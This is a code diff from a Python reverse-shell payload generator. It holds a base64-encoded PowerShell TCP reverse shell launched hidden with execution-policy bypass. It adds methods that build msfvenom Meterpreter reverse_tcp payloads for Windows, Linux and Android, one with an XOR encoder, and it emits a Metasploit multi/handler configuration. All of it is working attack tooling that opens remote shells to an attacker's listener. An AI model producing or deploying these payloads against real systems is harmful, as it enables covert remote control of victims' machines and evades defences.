@@ -19,3 +19,19 @@ p=subprocess.call(['/bin/sh','-i'])"""
         ps_cmd = f"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
         encoded_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
         return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded_ps}"
+    def generate_meterpreter_command(self, os_type="windows"):
+        if os_type == "windows":
+            return f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f exe -o payload.exe --encoder x64/xor_dynamic"
+        elif os_type == "linux":
+            return f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f elf -o payload.elf"
+        elif os_type == "android":
+            return f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -o payload.apk"
+        return ""
+    def get_msf_handler_config(self, os_type="windows"):
+        payloads = {
+            "windows": "windows/x64/meterpreter/reverse_tcp",
+            "linux": "linux/x64/meterpreter/reverse_tcp",
+            "android": "android/meterpreter/reverse_tcp"
+        }
+        p = payloads.get(os_type, "windows/x64/meterpreter/reverse_tcp")
+        return f"use exploit/multi/handler\nset PAYLOAD {p}\nset LHOST {self.lhost}\nset LPORT {self.lport}\nset EnableStageEncoding true\nexploit"
